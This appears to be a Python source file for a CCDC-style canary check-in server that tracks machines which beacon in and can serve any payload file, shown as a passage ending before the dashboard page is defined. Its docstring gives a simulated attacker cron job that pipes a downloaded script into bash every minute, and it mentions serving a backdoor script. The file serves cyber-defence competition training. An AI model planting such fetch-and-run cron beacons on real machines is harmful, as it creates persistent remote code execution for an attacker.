#!/usr/bin/env python3
"""
redhavi-monitor - CCDC canary check-in server.

CCDC-style concept:
  A compromised machine (backdoor or malicious cron job) continues checking in
  with this server every few minutes (for example, downloading the canary every
  three minutes). While it keeps requesting the canary, the machine is RED
  (dirty). If it stops for longer than the threshold (four minutes by default),
  it turns GREEN (clean). A later request turns it RED again.

  The server provides the canary at /checkin and records the requesting IP.
  A live web dashboard supports manually adding or removing IPs and
  automatically discovers clients when they check in.

No external dependencies; it uses only the Python standard library. Examples:
  redhavi-monitor
  redhavi-monitor --port 8081 --bind 0.0.0.0
  redhavi-monitor --payload ./my-backdoor.sh --clean-threshold 240

On the target machine, the simulated attacker's cron job could look like this:
  * * * * * curl -s http://YOUR_IP:8081/checkin | bash
Each request is recorded and keeps that IP RED.

The monitor listens on every interface by default. If the server has both IPs,
it can receive check-ins from both subnets:

  Windows / subnet 101:
    Invoke-RestMethod -Uri "http://172.16.101.77:8081/checkin"

  Fedora / subnet 102:
    curl -fsS -o /dev/null "http://172.16.102.58:8081/checkin"
"""

import argparse
import html
import json
import os
import threading
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

# ---------------------------------------------------------------------------
# Shared state
# ---------------------------------------------------------------------------
LOCK = threading.Lock()
STATE = {"machines": {}}   # ip -> {name, last_checkin, count, added}
CONFIG = {
    "state_file": None,
    "payload_file": None,
    "clean_threshold": 240,   # seconds without a check-in before turning GREEN
    "auto_discover": True,    # add new IPs when they check in
}

DEFAULT_PAYLOAD = "#!/usr/bin/env bash\n# redhavi canary\necho redhavi-checkin ok\n"


def now():
    return time.time()


def load_state():
    path = CONFIG["state_file"]
    if not path or not os.path.exists(path):
        return
    try:
        with open(path, "r") as f:
            data = json.load(f)
        if isinstance(data.get("machines"), dict):
            STATE["machines"] = data["machines"]
    except (OSError, ValueError):
        pass


def save_state():
    path = CONFIG["state_file"]
    if not path:
        return
    try:
        tmp = path + ".tmp"
        with open(tmp, "w") as f:
            json.dump(STATE, f)
        os.replace(tmp, path)
    except OSError:
        pass


def get_payload():
    path = CONFIG["payload_file"]
    if path and os.path.exists(path):
        try:
            with open(path, "rb") as f:
                return f.read()
        except OSError:
            pass
    return DEFAULT_PAYLOAD.encode()


def record_checkin(ip):
    """Record an IP check-in and discover it automatically when needed."""
    with LOCK:
        m = STATE["machines"].get(ip)
        if m is None:
            if not CONFIG["auto_discover"]:
                return
            m = {"name": "", "count": 0, "added": now()}
            STATE["machines"][ip] = m
        m["last_checkin"] = now()
        m["count"] = m.get("count", 0) + 1
        save_state()


def machine_status(m):
    """Red means a recent check-in; green means clean or never observed."""
    last = m.get("last_checkin")
    if last is None:
        return "green", None
    idle = now() - last
    if idle < CONFIG["clean_threshold"]:
        return "red", idle
    return "green", idle


def snapshot():
    out = []
    with LOCK:
        for ip, m in STATE["machines"].items():
            status, idle = machine_status(m)
            out.append({
                "ip": ip,
                "name": m.get("name", ""),
                "status": status,
                "idle": None if idle is None else int(idle),
                "count": m.get("count", 0),
                "last_checkin": m.get("last_checkin"),
            })
    out.sort(key=lambda r: (r["status"] != "red", r["ip"]))
    return out


# ---------------------------------------------------------------------------
# HTTP handler
# ---------------------------------------------------------------------------
class Handler(BaseHTTPRequestHandler):
    server_version = "redhavi-monitor"

    def log_message(self, fmt, *args):
        pass  # Keep the console quiet; the dashboard is the source of truth.

    def _send(self, code, body, ctype="text/plain; charset=utf-8"):
        if isinstance(body, str):
            body = body.encode()
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(body)

    def _json(self, code, obj):
        self._send(code, json.dumps(obj), "application/json; charset=utf-8")

    def client_ip(self):
        # Honor X-Forwarded-For when running behind a proxy.
        xff = self.headers.get("X-Forwarded-For")
        if xff:
            return xff.split(",")[0].strip()
        return self.client_address[0]

    def do_GET(self):
        path = self.path.split("?", 1)[0].rstrip("/")
        if path in ("", "/dashboard"):
            self._send(200, PAGE, "text/html; charset=utf-8")
        elif path == "/api/status":
            self._json(200, {"machines": snapshot(),
                             "threshold": CONFIG["clean_threshold"]})
        elif path in ("/checkin", "/redhavi-checkin"):
            record_checkin(self.client_ip())
            self._send(200, get_payload(),
                       "application/octet-stream")
        else:
            self._send(404, "not found\n")

    def _read_body(self):
        length = int(self.headers.get("Content-Length", 0) or 0)
        raw = self.rfile.read(length) if length else b""
        try:
            return json.loads(raw or b"{}")
        except ValueError:
            return {}

    def do_POST(self):
        path = self.path.split("?", 1)[0].rstrip("/")
        body = self._read_body()
        if path == "/api/add":
            ip = (body.get("ip") or "").strip()
            name = (body.get("name") or "").strip()
            if not ip:
                return self._json(400, {"error": "ip required"})
            with LOCK:
                m = STATE["machines"].get(ip)
                if m is None:
                    STATE["machines"][ip] = {"name": name, "count": 0,
                                             "added": now()}
                else:
                    m["name"] = name
                save_state()
            return self._json(200, {"ok": True})
        elif path == "/api/delete":
            ip = (body.get("ip") or "").strip()
            with LOCK:
                STATE["machines"].pop(ip, None)
                save_state()
            return self._json(200, {"ok": True})
        elif path == "/api/reset":
            ip = (body.get("ip") or "").strip()
            with LOCK:
                m = STATE["machines"].get(ip)
                if m:
                    m.pop("last_checkin", None)
                    save_state()
            return self._json(200, {"ok": True})
        else:
            self._json(404, {"error": "not found"})


